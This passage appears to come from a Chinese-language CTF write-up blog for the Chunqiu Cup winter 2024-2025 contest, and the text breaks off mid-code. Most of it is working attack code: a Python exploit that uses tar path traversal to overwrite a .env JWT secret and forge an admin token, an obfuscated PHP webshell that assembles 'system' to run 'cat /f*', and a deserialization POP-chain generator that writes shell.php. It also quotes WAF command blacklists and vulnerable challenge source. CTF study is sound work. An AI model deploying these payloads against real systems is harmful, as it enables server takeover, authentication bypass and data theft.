python"><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> tarfile<br><span class="hljs-comment"># import sys</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_random_string</span>(<span class="hljs-params">length</span>):<br>    letters = string.ascii_letters + string.digits<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(letters) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_request</span>(<span class="hljs-params">session, method, path, data=<span class="hljs-literal">None</span>, files=<span class="hljs-literal">None</span>, headers=<span class="hljs-literal">None</span></span>):<br>    url = <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;session.url&#125;</span><span class="hljs-subst">&#123;path&#125;</span>&quot;</span><br>    response = session.request(method, url, data=data, files=files, headers=headers)<br>    <span class="hljs-keyword">return</span> response<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_jwt</span>(<span class="hljs-params">user_id, is_admin, jwt_key</span>):<br>    expiration_time = datetime.datetime.utcnow() + datetime.timedelta(hours=<span class="hljs-number">24</span>)<br>    claims = &#123;<br>        <span class="hljs-string">&#x27;UserID&#x27;</span>: user_id,<br>        <span class="hljs-string">&#x27;IsAdmin&#x27;</span>: is_admin,<br>        <span class="hljs-string">&#x27;exp&#x27;</span>: expiration_time<br>    &#125;<br>    token = jwt.encode(claims, jwt_key, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>)<br>    <span class="hljs-keyword">return</span> token<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_malicious_tar</span>():<br>    <span class="hljs-comment"># Create the directory and .env file</span><br>    os.makedirs(<span class="hljs-string">&#x27;exp&#x27;</span>, exist_ok=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exp/.env&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(<span class="hljs-string">&quot;JWT_SECRET=hack&quot;</span>)<br><br>    <span class="hljs-comment"># Create the tar file with the path traversal</span><br>    <span class="hljs-keyword">with</span> tarfile.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;hack.tar&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> tar:<br>        tar.add(<span class="hljs-string">&#x27;exp/.env&#x27;</span>, arcname=<span class="hljs-string">&#x27;exp/../../../.env&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">url, token</span>):<br><br>    session = requests.Session()<br>    session.url = url<br><br>    random_string = generate_random_string(<span class="hljs-number">4</span>)<br><br>    user_data = &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: random_string,<br>        <span class="hljs-string">&quot;password&quot;</span>: random_string<br>    &#125;<br>    response1 = send_request(session, <span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;/register&#x27;</span>, data=user_data)<br>    <span class="hljs-keyword">if</span> response1.status_code != <span class="hljs-number">200</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Failed to register&quot;</span><br>    response2 = send_request(session, <span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;/login&#x27;</span>, data=user_data)<br>    <span class="hljs-keyword">if</span> response2.status_code != <span class="hljs-number">200</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Failed to login&quot;</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;hack.tar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: f&#125;<br>        response3 = send_request(session, <span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;/upload&#x27;</span>, files=files)<br>        <span class="hljs-keyword">if</span> response3.status_code != <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Failed to upload malicious tar file&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Malicious tar file uploaded successfully&quot;</span>)<br><br>    <span class="hljs-comment"># 触发加载环境变量</span><br>    send_request(session, <span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;/login&#x27;</span>)<br>    headers = &#123;<br>        <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">f&#x27;token=<span class="hljs-subst">&#123;token&#125;</span>&#x27;</span><br>    &#125;<br>    response4 = send_request(session, <span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;/download/1&#x27;</span>, headers=headers)<br>    <span class="hljs-keyword">return</span> response4.text<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    create_malicious_tar()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Malicious tar file created: hack.tar&quot;</span>)<br><br>    jwt_key = <span class="hljs-string">&quot;hack&quot;</span><br>    user_id = <span class="hljs-number">1</span><br>    is_admin = <span class="hljs-literal">True</span><br><br>    token = generate_jwt(user_id, is_admin, jwt_key)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Generated JWT:&quot;</span>, token)<br><br>    URL = <span class="hljs-string">&quot;eci-2ze0cotvkmimmcve27y0.cloudeci1.ichunqiu.com:80&quot;</span><br>    flag = exp(URL, token)<br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250118001636167.png" alt="image-20250118001636167"></p><p>第二天有缘再看吧，跟西湖撞了hhh。</p><hr><h2 id="day2-easy-ser"><a href="#day2-easy-ser" class="headerlink" title="day2-easy_ser"></a>day2-easy_ser</h2><p>pop链简单，不多说。</p><p>绕waf1和waf3也简单，拼接就绕了。</p><p>waf2有点东西，会给你格式化输出，这样就相当于让你写🐎进去中间有一堆十六进制特征字符，php没用了。</p><p>其实很简单，悟到了直接010editor一行一行用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/* */</span><br></code></pre></td></tr></table></figure><p>来注释掉多余的十六进制信息就行了，然后和拼接配合一下，每行十六个字符内能放下每行的payload：</p><p>我选择造的payload（这里用&lt;?php会报错，不知道为啥，但是用短标签就没问题）:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><br><span class="hljs-variable">$s</span>=<span class="hljs-string">&#x27;s&#x27;</span>;<br><span class="hljs-variable">$y</span>=<span class="hljs-string">&#x27;y&#x27;</span>;<br><span class="hljs-variable">$t</span>=<span class="hljs-string">&#x27;t&#x27;</span>;<br><span class="hljs-variable">$e</span>=<span class="hljs-string">&#x27;e&#x27;</span>;<br><span class="hljs-variable">$m</span>=<span class="hljs-string">&#x27;m&#x27;</span>;<br><span class="hljs-variable">$x</span>=<span class="hljs-variable">$s</span>.<span class="hljs-variable">$y</span>;<br><span class="hljs-variable">$y</span>=<span class="hljs-variable">$x</span>.<span class="hljs-variable">$s</span>;<br><span class="hljs-variable">$z</span>=<span class="hljs-variable">$y</span>.<span class="hljs-variable">$t</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$z</span>.<span class="hljs-variable">$e</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$m</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-string">&#x27;whoami&#x27;</span>;<br><span class="hljs-variable">$b</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>直接开造：</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250119003613119.png" alt="image-20250119003613119"></p><p>得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>   <span class="hljs-comment">/*         */</span><span class="hljs-variable">$s</span>=<span class="hljs-string">&#x27;s&#x27;</span>;<span class="hljs-comment">/*     */</span><span class="hljs-variable">$y</span>=<span class="hljs-string">&#x27;y&#x27;</span>;<span class="hljs-comment">/*     */</span><span class="hljs-variable">$t</span>=<span class="hljs-string">&#x27;t&#x27;</span>;<span class="hljs-comment">/*     */</span><span class="hljs-variable">$e</span>=<span class="hljs-string">&#x27;e&#x27;</span>;<span class="hljs-comment">/*     */</span><span class="hljs-variable">$m</span>=<span class="hljs-string">&#x27;m&#x27;</span>;<span class="hljs-comment">/*     */</span><span class="hljs-variable">$x</span>=<span class="hljs-variable">$s</span>.<span class="hljs-variable">$y</span>;<span class="hljs-comment">/*   */</span><span class="hljs-variable">$y</span>=<span class="hljs-variable">$x</span>.<span class="hljs-variable">$s</span>;<span class="hljs-comment">/*   */</span><span class="hljs-variable">$z</span>=<span class="hljs-variable">$y</span>.<span class="hljs-variable">$t</span>;<span class="hljs-comment">/*   */</span><span class="hljs-variable">$a</span>=<span class="hljs-variable">$z</span>.<span class="hljs-variable">$e</span>;<span class="hljs-comment">/*   */</span><span class="hljs-variable">$b</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$m</span>;<span class="hljs-comment">/*   */</span><span class="hljs-variable">$c</span>=<span class="hljs-string">&#x27;cat &#x27;</span>;<span class="hljs-comment">/*  */</span><span class="hljs-variable">$d</span>=<span class="hljs-string">&#x27;/f*&#x27;</span>;<span class="hljs-comment">/*   */</span><span class="hljs-variable">$r</span>=<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>;<span class="hljs-comment">/*   */</span><span class="hljs-variable">$b</span>(<span class="hljs-variable">$r</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>base64编码再放exp里梭序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//error_reporting(0);</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PassWAF1</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>    <span class="hljs-variable">$BlackList</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;popen&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;assert&quot;</span>, <span class="hljs-string">&quot;phpinfo&quot;</span>, <span class="hljs-string">&quot;shell_exec&quot;</span>,  <span class="hljs-string">&quot;pcntl_exec&quot;</span>, <span class="hljs-string">&quot;passthru&quot;</span>, <span class="hljs-string">&quot;popen&quot;</span>, <span class="hljs-string">&quot;putenv&quot;</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$BlackList</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&quot;</span> . <span class="hljs-variable">$value</span> . <span class="hljs-string">&quot;/im&quot;</span>, <span class="hljs-variable">$data</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PassWAF2</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$output</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$count</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-variable">$str</span>, <span class="hljs-number">16</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$v</span>) &#123;<br>        <span class="hljs-variable">$hex_string</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$v</span>), <span class="hljs-number">4</span>));<br>        <span class="hljs-variable">$ascii_string</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-variable">$v</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$c</span>) &#123;<br>            <span class="hljs-variable">$ascii_string</span> .= ((<span class="hljs-variable">$c</span> &lt; <span class="hljs-string">&#x27; &#x27;</span> || <span class="hljs-variable">$c</span> &gt; <span class="hljs-string">&#x27;~&#x27;</span>) ? <span class="hljs-string">&#x27;.&#x27;</span> : <span class="hljs-variable">$c</span>);<br>        &#125;<br>        <span class="hljs-variable">$output</span> .= <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%08x: %-40s %-16s\n&quot;</span>, <span class="hljs-variable">$count</span>, <span class="hljs-variable">$hex_string</span>, <span class="hljs-variable">$ascii_string</span>);<br>        <span class="hljs-variable">$count</span> += <span class="hljs-number">16</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PassWAF3</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>    <span class="hljs-variable">$BlackList</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\.\.&quot;</span>, <span class="hljs-string">&quot;\/&quot;</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$BlackList</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&quot;</span> . <span class="hljs-variable">$value</span> . <span class="hljs-string">&quot;/im&quot;</span>, <span class="hljs-variable">$data</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Base64Decode</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;<br>    <span class="hljs-variable">$decodeStr</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$s</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_bool</span>(<span class="hljs-variable">$decodeStr</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;gg&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$decodeStr</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">STU</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$stu</span>;<span class="hljs-comment">// = new CTF();</span><br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SDU</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Dazhuan</span>;<span class="hljs-comment">// = new STU();</span><br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hackman</span>; <span class="hljs-comment">//base64的payload</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br><br>&#125;<br><br><span class="hljs-variable">$stu</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">STU</span>();<br><span class="hljs-variable">$sdu</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SDU</span>();<br><span class="hljs-variable">$ctf</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<br><span class="hljs-variable">$sdu</span>-&gt;Dazhuan = <span class="hljs-variable">$stu</span>;<br><span class="hljs-variable">$stu</span>-&gt;stu = <span class="hljs-variable">$ctf</span>;<br><span class="hljs-variable">$ctf</span>-&gt;hackman = <span class="hljs-string">&quot;PD8gICAvKiAgICAgICAgICovJHM9J3MnOy8qICAgICAqLyR5PSd5JzsvKiAgICAgKi8kdD0ndCc7LyogICAgICovJGU9J2UnOy8qICAgICAqLyRtPSdtJzsvKiAgICAgKi8keD0kcy4keTsvKiAgICovJHk9JHguJHM7LyogICAqLyR6PSR5LiR0Oy8qICAgKi8kYT0kei4kZTsvKiAgICovJGI9JGEuJG07LyogICAqLyRjPSdjYXQgJzsvKiAgKi8kZD0nL2YqJzsvKiAgICovJHI9JGMuJGQ7LyogICAqLyRiKCRyKT8+&quot;</span>;<br><span class="hljs-variable">$ctf</span>-&gt;filename = <span class="hljs-string">&quot;shell.php&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$sdu</span>));<br></code></pre></td></tr></table></figure><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250119003834715.png" alt="image-20250119003834715"></p><h2 id="day2-b0okshelf"><a href="#day2-b0okshelf" class="headerlink" title="day2-b0okshelf"></a>day2-b0okshelf</h2><p>那个有问题的easy_code题下了挺抽象的，反正也不想看了。</p><p>这个题有点意思，最后做出来的只有一个人，纯缝合怪。或许是大哥们都去看西湖了没人打题吧。</p><p>浅浅复现一下，首先robots.txt：</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250119004111330.png" alt="image-20250119004111330"></p><p>访问一下backup.zip获得源码：</p><p>update.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;data.php&#x27;</span>;<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$regexResult</span> = <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[^A-Za-z0-9_]/&#x27;</span>, <span class="hljs-variable">$id</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$regexResult</span> === <span class="hljs-literal">false</span> || <span class="hljs-variable">$regexResult</span> === <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Illegal character detected&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$id</span>) &gt; <span class="hljs-number">100</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Is this your id?&#x27;</span>);<br>&#125;<br><span class="hljs-comment">// check if file exists</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;books/&#x27;</span> . <span class="hljs-variable">$id</span> . <span class="hljs-string">&#x27;.info&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Book not found&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;books/&#x27;</span> . <span class="hljs-variable">$id</span> . <span class="hljs-string">&#x27;.info&#x27;</span>);<br><span class="hljs-variable">$book</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$content</span>);<br><span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$book</span> <span class="hljs-keyword">instanceof</span> Book) || !(<span class="hljs-variable">$book</span>-&gt;reader <span class="hljs-keyword">instanceof</span> Reader)) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;Invalid data&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br><br>    <span class="hljs-variable">$book</span>-&gt;title = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>    <span class="hljs-variable">$book</span>-&gt;author = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;author&#x27;</span>];<br>    <span class="hljs-variable">$book</span>-&gt;summary = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;summary&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;books/&#x27;</span> . <span class="hljs-variable">$book</span>-&gt;id . <span class="hljs-string">&#x27;.info&#x27;</span>, <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$book</span>)));<br>    <span class="hljs-variable">$book</span>-&gt;reader-&gt;<span class="hljs-title function_ invoke__">setContent</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;\\&#x27;&quot;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&#x27;common/header.php&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里的book使用serialize来存储的，虽然waf会替换<code>‘</code>为<code>\&#39;</code>，这里其实就导致了php反序列化中的字符串逃逸，通过这种逃逸我们可以插入想要的payload。</p><p>这里显然我们可以逃逸掉 <code>Reader</code> 中的路径, 从而使其能够变成任意路径：</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250119004704065.png" alt="image-20250119004704065"></p><p>在 <code>update.php</code> 中有 <code>file_put_contents</code> 函数。<code>file_put_contents</code> 可以将数据写入文件，我们可以利用它来写入一句话木马。</p><p>字符串逃逸调试：（抄一手官方的，懒得写了www）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Book</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$title</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$author</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$summary</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$reader</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reader</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$location</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;location = <span class="hljs-variable">$location</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getLocation</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;location;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$location</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getContent</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;location);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setContent</span>(<span class="hljs-params"><span class="hljs-variable">$content</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;location, <span class="hljs-variable">$content</span>);<br>    &#125;<br>&#125;<br><br><span 